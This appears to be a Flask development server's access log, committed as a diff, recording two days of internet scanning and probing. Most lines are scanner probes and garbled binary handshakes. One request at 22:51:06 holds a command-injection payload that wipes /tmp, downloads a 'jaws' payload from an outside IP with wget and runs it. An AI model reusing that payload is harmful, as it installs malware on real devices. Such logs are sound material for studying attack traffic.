+INFO:werkzeug:188.166.229.98 - - [20/Apr/2023 13:58:06] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:188.166.229.98 - - [20/Apr/2023 13:58:06] "[33mGET /client/get_targets HTTP/1.1[0m" 404 -
+INFO:werkzeug:188.166.229.98 - - [20/Apr/2023 13:58:07] "[33mGET /upl.php HTTP/1.1[0m" 404 -
+ERROR:werkzeug:188.166.229.98 - - [20/Apr/2023 13:58:07] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:188.166.229.98 - - [20/Apr/2023 13:58:07] "[35m[1m {  wÃdÏÅbl¶lþ>²ª¿ÇÒ®Ó."ÜUù;Þ  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:188.166.229.98 - - [20/Apr/2023 13:58:07] "[33mGET /geoip/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:188.166.229.98 - - [20/Apr/2023 13:58:08] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:188.166.229.98 - - [20/Apr/2023 13:58:08] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [20/Apr/2023 14:32:17] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:185.152.110.10 - - [20/Apr/2023 14:38:09] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:198.199.94.19 - - [20/Apr/2023 14:56:10] code 400, message Bad request syntax ('MGLNDD_46.38.236.126_80')
+INFO:werkzeug:198.199.94.19 - - [20/Apr/2023 14:56:10] "[35m[1mMGLNDD_46.38.236.126_80[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:128.1.248.26 - - [20/Apr/2023 14:59:16] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:45.79.128.205 - - [20/Apr/2023 15:49:30] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:45.79.128.205 - - [20/Apr/2023 15:49:30] "[35m[1m   ¹V_B,cÓmB8Èøm­sÐ]òC,Q|Ö,ø9   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:34.76.158.233 - - [20/Apr/2023 15:54:10] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:107.170.236.16 - - [20/Apr/2023 16:04:02] "[33mGET /portal/redlion HTTP/1.1[0m" 404 -
+INFO:werkzeug:198.199.98.85 - - [20/Apr/2023 16:35:38] "[33mGET /hudson HTTP/1.1[0m" 404 -
+INFO:werkzeug:192.241.207.99 - - [20/Apr/2023 16:35:48] "[33mGET /actuator/health HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [20/Apr/2023 16:40:48] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:148.72.211.177 - - [20/Apr/2023 18:01:38] "[33mGET /wp-login.php HTTP/1.1[0m" 404 -
+ERROR:werkzeug:124.158.8.81 - - [20/Apr/2023 18:15:08] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00+&à\x00\x00\x00\x00\x00Cookie:')
+INFO:werkzeug:124.158.8.81 - - [20/Apr/2023 18:15:08] "[35m[1m  +&à     Cookie: mstshash=hello[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:27.124.12.9 - - [20/Apr/2023 18:46:34] "[33mGET /vodhtml/98360.html HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [20/Apr/2023 18:51:08] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:124.158.8.81 - - [20/Apr/2023 18:56:36] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00+&à\x00\x00\x00\x00\x00Cookie:')
+INFO:werkzeug:124.158.8.81 - - [20/Apr/2023 18:56:36] "[35m[1m  +&à     Cookie: mstshash=hello[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:124.158.8.81 - - [20/Apr/2023 19:39:14] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00+&à\x00\x00\x00\x00\x00Cookie:')
+INFO:werkzeug:124.158.8.81 - - [20/Apr/2023 19:39:14] "[35m[1m  +&à     Cookie: mstshash=hello[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:79.124.59.170 - - [20/Apr/2023 20:13:04] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:179.43.177.243 - - [20/Apr/2023 20:13:13] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:124.158.8.81 - - [20/Apr/2023 20:20:44] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00+&à\x00\x00\x00\x00\x00Cookie:')
+INFO:werkzeug:124.158.8.81 - - [20/Apr/2023 20:20:44] "[35m[1m  +&à     Cookie: mstshash=hello[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:14.116.184.240 - - [20/Apr/2023 20:24:59] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [20/Apr/2023 20:38:06] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:124.158.8.81 - - [20/Apr/2023 21:02:41] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00+&à\x00\x00\x00\x00\x00Cookie:')
+INFO:werkzeug:124.158.8.81 - - [20/Apr/2023 21:02:41] "[35m[1m  +&à     Cookie: mstshash=hello[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:124.158.8.81 - - [20/Apr/2023 21:45:04] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00+&à\x00\x00\x00\x00\x00Cookie:')
+INFO:werkzeug:124.158.8.81 - - [20/Apr/2023 21:45:04] "[35m[1m  +&à     Cookie: mstshash=hello[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:45.79.181.104 - - [20/Apr/2023 21:56:01] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:183.136.225.44 - - [20/Apr/2023 22:22:35] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:183.136.225.44 - - [20/Apr/2023 22:22:44] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:183.136.225.44 - - [20/Apr/2023 22:22:45] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:183.136.225.44 - - [20/Apr/2023 22:22:50] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+INFO:werkzeug:108.240.239.107 - - [20/Apr/2023 22:51:06] "[33mGET /shell?cd+/tmp;rm+-rf+*;wget+45.81.243.34/jaws;sh+/tmp/jaws HTTP/1.1[0m" 404 -
+INFO:werkzeug:87.121.221.49 - - [20/Apr/2023 23:22:04] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:179.43.177.243 - - [20/Apr/2023 23:30:55] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [21/Apr/2023 00:03:11] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:88.160.248.20 - - [21/Apr/2023 00:03:51] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:199.188.205.87 - - [21/Apr/2023 00:14:53] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:140.246.136.252 - - [21/Apr/2023 01:23:49] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:167.248.133.34 - - [21/Apr/2023 01:29:08] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:167.248.133.34 - - [21/Apr/2023 01:29:08] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:167.248.133.34 - - [21/Apr/2023 01:29:08] code 505, message Invalid HTTP version (2.0)
+INFO:werkzeug:167.248.133.34 - - [21/Apr/2023 01:29:08] "[35m[1mPRI * HTTP/2.0[0m" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+INFO:werkzeug:167.248.133.34 - - [21/Apr/2023 01:29:09] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:103.187.190.63 - - [21/Apr/2023 02:07:08] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:09] "OPTIONS / HTTP/1.0" 200 -
+ERROR:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:09] code 400, message Bad request version ('RTSP/1.0')
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:09] "[35m[1mOPTIONS / RTSP/1.0[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:14] code 400, message Bad HTTP/0.9 request type ('l\x00')
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:14] "[35m[1ml          [0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:15] "[33mGET /nice%20ports,/Trinity.txt.bak HTTP/1.0[0m" 404 -
+ERROR:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:20] code 400, message Bad request version ('\x00\x01\x97|\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:20] "[35m[1m  (rþ          |                    [0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:103.187.190.63 - - [21/Apr/2023 02:07:25] code 400, message Bad HTTP/0.9 request type ('\x00')
+INFO:werkzeug:103.187.190.63 - - [21/Apr/2023 02:07:25] "[35m[1m          versionbind   [0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:31] code 400, message Bad HTTP/0.9 request type ('\x00')
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:31] "[35m[1m            [0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:103.187.190.58 - - [21/Apr/2023 02:07:31] code 400, message Bad request syntax ('HELP')
+INFO:werkzeug:103.187.190.58 - - [21/Apr/2023 02:07:31] "[35m[1mHELP[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:31] code 400, message Bad request syntax ('\x16\x03\x00\x00S\x01\x00\x00O\x03\x00?G×÷º,îê²`~ó\x00ý\x82{¹Õ\x96Èw\x9bæÄÛ<=Ûoï\x10n\x00\x00(\x00\x16\x00\x13\x00')
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:31] "[35m[1m  S  O ?G×÷º,îê²`~ó ý{¹ÕÈwæÄÛ<=Ûoïn  (   [0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:31] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:31] "[35m[1m  *%à     Cookie: mstshash=nmap[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:32] code 400, message Bad request version ('\x00/\x00')
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:32] "[35m[1m  i  eU§ärandom1random2random3random4   / [0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:32] code 400, message Bad request syntax ('\x00\x00\x00qj\x81n0\x81k¡\x03\x02\x01\x05¢\x03\x02\x01')
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:32] "[35m[1m   qjn0k¡¢[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:37] code 400, message Bad request version ('0.12\x00')
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:37] "[35m[1m   ¤ÿSMBr    @              @     PC NETWORK PROGRAM 1.0 MICROSOFT NETWORKS 1.03 MICROSOFT NETWORKS 3.0 LANMAN1.0 LM1.2X002 Samba NT LANMAN 1.0 NT LM 0.12 [0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:37] code 400, message Bad request syntax ('\x01default')
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:37] "[35m[1mdefault[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:38] code 400, message Bad request syntax ('0\x84\x00\x00\x00-\x02\x01\x07c\x84\x00\x00\x00$\x04\x00')
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:38] "[35m[1m0   -c   $ [0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:43] code 400, message Bad HTTP/0.9 request type ('0')
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:43] "[35m[1m0`  [0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:103.187.190.36 - - [21/Apr/2023 02:07:43] code 400, message Bad request version ('SIP/2.0')
+INFO:werkzeug:103.187.190.36 - - [21/Apr/2023 02:07:43] "[35m[1mOPTIONS sip:nm SIP/2.0[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:48] code 400, message Bad request syntax ('TNMP\x04\x00\x00\x00TNME\x00\x00\x04\x00')
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:48] "[35m[1mTNMP   TNME   [0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:54] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00')
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:54] "[35m[1m  à     [0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:59] code 400, message Bad request syntax ('DmdT\x00\x00\x00\x17\x00\x00\x00\x01\x00\x00\x00\x00\x11\x11\x00ÿ\x01ÿ\x13')
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:07:59] "[35m[1mDmdT           ÿÿ[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:103.187.190.56 - - [21/Apr/2023 02:08:04] code 400, message Bad HTTP/0.9 request type (':\x00\x00\x00/\x00\x00\x00\x02\x00\x00@\x02\x0f\x00\x01\x00=\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/\x00\x00\x00\x00\x00\x00\x00\x00\x00@')
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:08:04] "[35m[1m:   /     @  =            /         @                 [0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:103.187.190.56 - - [21/Apr/2023 02:08:09] code 400, message Bad request syntax ('JRMI\x00\x02K')
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:08:09] "[35m[1mJRMI K[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:103.187.190.56 - - [21/Apr/2023 02:08:14] code 400, message Bad request version ('\x00{\x000\x000\x000\x000\x00A\x00A\x000\x000\x00-\x000\x00A\x000\x000\x00-\x000\x000\x00a\x000\x00-\x00A\x00A\x000\x00A\x00-\x000\x000\x000\x000\x00A\x000\x00A\x00A\x000\x00A\x00A\x000\x00}\x00\x00\x00àmß_')
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:08:14] "[35m[1m  ýÎú°    MMS                    ðððð    N S P l a y e r / 9 . 0 . 0 . 2 9 8 0 ;   { 0 0 0 0 A A 0 0 - 0 A 0 0 - 0 0 a 0 - A A 0 A - 0 0 0 0 A 0 A A 0 A A 0 }   àmß_[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:103.187.190.56 - - [21/Apr/2023 02:08:19] code 400, message Bad HTTP/0.9 request type ('\x00Z\x00\x00\x01\x00\x00\x00\x016\x01,\x00\x00\x08\x00\x7fÿ\x7f\x08\x00\x00\x00\x01\x00')
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:08:19] "[35m[1m Z     6,   ÿ      :                4æ           (CONNECT_DATA=(COMMAND=version))[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:103.187.190.56 - - [21/Apr/2023 02:08:25] code 400, message Bad request version ('\x03\x00(\x00\x04ÿ\x08\x00\x01U\x00\x00\x00MSSQLServer\x00H\x0f\x00\x00')
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:08:25] "[35m[1m 4            ( ÿ U   MSSQLServer H  [0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:103.187.190.56 - - [21/Apr/2023 02:08:30] code 400, message Bad request syntax ('\x00\x03\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x0f\x00')
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:08:30] "[35m[1m              [0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:103.187.190.56 - - [21/Apr/2023 02:08:35] code 400, message Bad request syntax ('GIOP\x01\x00\x01\x00$\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00abcdef\x00\x00\x04\x00\x00\x00get\x00\x00\x00\x00\x00')
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:08:35] "[35m[1mGIOP  $                abcdef     get     [0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:103.187.190.45 - - [21/Apr/2023 02:08:35] code 400, message Bad HTTP/0.9 request type ('t3')
+ERROR:werkzeug:103.187.190.56 - - [21/Apr/2023 02:08:35] code 400, message Bad request version ('\x00/\x00')
+INFO:werkzeug:103.187.190.45 - - [21/Apr/2023 02:08:35] "[35m[1mt3 12.1.2[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:08:35] "[35m[1m  i  eU§ärandom1random2random3random4   / [0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:103.187.190.63 - - [21/Apr/2023 02:08:35] "[33mGET /nmaplowercheck1682035715 HTTP/1.1[0m" 404 -
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:08:35] "[33mPOST /sdk HTTP/1.1[0m" 404 -
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:08:36] "[33mGET /evox/about HTTP/1.1[0m" 404 -
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:08:36] "[33mGET /HNAP1 HTTP/1.1[0m" 404 -
+INFO:werkzeug:103.187.190.56 - - [21/Apr/2023 02:08:36] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:103.187.190.58 - - [21/Apr/2023 02:08:38] code 400, message Bad HTTP/0.9 request type ('\x80\x00\x00(EO÷¡\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86')
+INFO:werkzeug:103.187.190.58 - - [21/Apr/2023 02:08:38] "[35m[1m  (EO÷¡                                [0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:193.32.162.159 - - [21/Apr/2023 02:09:37] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:59.92.162.98 - - [21/Apr/2023 02:09:47] "[33mPOST /HNAP1/ HTTP/1.0[0m" 404 -
+INFO:werkzeug:198.235.24.182 - - [21/Apr/2023 02:27:49] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:183.136.225.46 - - [21/Apr/2023 03:13:31] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:183.136.225.46 - - [21/Apr/2023 03:13:33] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:183.136.225.46 - - [21/Apr/2023 03:13:34] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:183.136.225.46 - - [21/Apr/2023 03:13:35] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+INFO:werkzeug:183.136.225.46 - - [21/Apr/2023 03:13:36] "GET /static/js/main.js HTTP/1.1" 200 -
+INFO:werkzeug:183.136.225.46 - - [21/Apr/2023 03:13:38] "GET /static/js/notify.js HTTP/1.1" 200 -
+INFO:werkzeug:162.142.125.13 - - [21/Apr/2023 03:35:18] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:162.142.125.13 - - [21/Apr/2023 03:35:18] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:162.142.125.13 - - [21/Apr/2023 03:35:18] code 505, message Invalid HTTP version (2.0)
+INFO:werkzeug:162.142.125.13 - - [21/Apr/2023 03:35:18] "[35m[1mPRI * HTTP/2.0[0m" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+INFO:werkzeug:162.142.125.13 - - [21/Apr/2023 03:35:18] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [21/Apr/2023 04:14:13] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:184.105.247.252 - - [21/Apr/2023 04:20:07] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:184.105.247.252 - - [21/Apr/2023 04:22:02] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:184.105.247.252 - - [21/Apr/2023 04:23:10] "[33mGET /geoserver/web/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.118.53.194 - - [21/Apr/2023 04:54:07] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [21/Apr/2023 07:12:29] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:103.62.152.157 - - [21/Apr/2023 07:31:06] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:185.100.87.136 - - [21/Apr/2023 08:09:58] code 400, message Bad HTTP/0.9 request type ('\x10')
+INFO:werkzeug:185.100.87.136 - - [21/Apr/2023 08:09:58] "[35m[1m   BBBBºÁ«DAAA[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:185.100.87.136 - - [21/Apr/2023 08:10:08] code 400, message Bad request version ('Ý%d1\x17¦%nÅ')
+INFO:werkzeug:185.100.87.136 - - [21/Apr/2023 08:10:08] "[35m[1mÉÑ¦®lM/	p#î*5#]ÇR:È/¸ÍZû¤fÒÎ³¡»ü Ý%d1¦%nÅ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:193.32.162.159 - - [21/Apr/2023 09:33:17] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:205.210.31.171 - - [21/Apr/2023 09:45:57] code 400, message Bad request version ('À(À$À\x14À')
+INFO:werkzeug:205.210.31.171 - - [21/Apr/2023 09:45:57] "[35m[1m Ê  Æ¦¿úøf¦± "Óà4¡EÉæs\ä£¼!  hÌÌÀ/À+À0À,ÀÀÀ'À#ÀÀ	À(À$ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:150.129.136.34 - - [21/Apr/2023 10:03:12] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:198.199.96.57 - - [21/Apr/2023 10:08:30] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:205.210.31.9 - - [21/Apr/2023 11:31:42] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:94.232.42.99 - - [21/Apr/2023 11:36:34] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+INFO:werkzeug:94.232.42.99 - - [21/Apr/2023 11:36:34] "[35m[1m  ,'à     Cookie: mstshash=Domain[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:94.232.42.99 - - [21/Apr/2023 11:36:35] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+INFO:werkzeug:94.232.42.99 - - [21/Apr/2023 11:36:35] "[35m[1m  ,'à     Cookie: mstshash=Domain[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:94.232.42.99 - - [21/Apr/2023 11:36:35] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+INFO:werkzeug:94.232.42.99 - - [21/Apr/2023 11:36:35] "[35m[1m  ,'à     Cookie: mstshash=Domain[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:193.32.162.159 - - [21/Apr/2023 11:41:56] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:45.128.232.175 - - [21/Apr/2023 11:44:13] "[33mCONNECT google.com:443 HTTP/1.1[0m" 404 -
+INFO:werkzeug:198.20.101.98 - - [21/Apr/2023 12:46:46] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:198.20.101.98 - - [21/Apr/2023 12:47:41] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:198.20.101.98 - - [21/Apr/2023 12:47:41] "[35m[1m î  ê¦Hs3)Ä19»a:O&²/PÍ?ûÓqQ ìç ?Uæ|9è6w#NG.ðµ5>æ`ï´Âç &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:79.124.59.170 - - [21/Apr/2023 12:50:17] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:128.14.209.162 - - [21/Apr/2023 12:50:24] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:128.14.209.162 - - [21/Apr/2023 12:50:25] "[33mGET /showLogin.cc HTTP/1.1[0m" 404 -
+INFO:werkzeug:79.124.59.170 - - [21/Apr/2023 13:46:18] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:87.121.221.49 - - [21/Apr/2023 14:09:38] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [21/Apr/2023 14:49:24] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:178.79.174.9 - - [21/Apr/2023 14:52:01] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:179.43.177.243 - - [21/Apr/2023 14:57:23] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:167.94.145.59 - - [21/Apr/2023 15:07:53] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:167.94.145.59 - - [21/Apr/2023 15:07:53] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:167.94.145.59 - - [21/Apr/2023 15:07:53] code 505, message Invalid HTTP version (2.0)
+INFO:werkzeug:167.94.145.59 - - [21/Apr/2023 15:07:53] "[35m[1mPRI * HTTP/2.0[0m" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+INFO:werkzeug:167.94.145.59 - - [21/Apr/2023 15:07:53] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:79.124.59.170 - - [21/Apr/2023 15:38:46] "[33mGET /main.asp HTTP/1.0[0m" 404 -
+INFO:werkzeug:34.22.147.120 - - [21/Apr/2023 15:47:01] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:45.79.181.94 - - [21/Apr/2023 15:58:25] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:45.79.181.94 - - [21/Apr/2023 15:58:25] "[35m[1m   pÞ-8#ÖèÌâ2Æà¥dÌ¿øE¿ÜNtW   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:106.75.154.169 - - [21/Apr/2023 17:00:52] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:106.75.154.169 - - [21/Apr/2023 17:00:53] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:106.75.154.169 - - [21/Apr/2023 17:00:54] "GET /static/js/main.js HTTP/1.1" 200 -
+INFO:werkzeug:92.118.39.82 - - [21/Apr/2023 18:06:23] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:185.133.214.138 - - [21/Apr/2023 18:20:19] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [21/Apr/2023 18:54:25] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:179.43.177.243 - - [21/Apr/2023 19:30:11] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:112.239.96.236 - - [21/Apr/2023 19:38:51] "[33mPOST /HNAP1/ HTTP/1.0[0m" 404 -
+ERROR:werkzeug:164.90.200.142 - - [21/Apr/2023 19:59:03] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:164.90.200.142 - - [21/Apr/2023 19:59:03] "[35m[1m {  wûÁ¾NG¼o$vÇòÁ¿ÃR~OhìÆ²Ù}Þ¸  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:164.90.200.142 - - [21/Apr/2023 19:59:03] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:164.90.200.142 - - [21/Apr/2023 19:59:03] "[35m[1m {  w]ÿ!â<Ì[¨ d»éÒ±·Hf¶5ªýZH)  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:164.90.200.142 - - [21/Apr/2023 19:59:03] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:164.90.200.142 - - [21/Apr/2023 19:59:03] "[33mGET /client/get_targets HTTP/1.1[0m" 404 -
+INFO:werkzeug:164.90.200.142 - - [21/Apr/2023 19:59:03] "[33mGET /upl.php HTTP/1.1[0m" 404 -
+ERROR:werkzeug:164.90.200.142 - - [21/Apr/2023 19:59:03] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:164.90.200.142 - - [21/Apr/2023 19:59:03] "[35m[1m {  wS-5Ï3½ÿÖ0l©ûá¹=äþêeÏHa3  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:164.90.200.142 - - [21/Apr/2023 19:59:03] "[33mGET /geoip/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:164.90.200.142 - - [21/Apr/2023 19:59:03] "GET / HTTP/1.1" 200 -
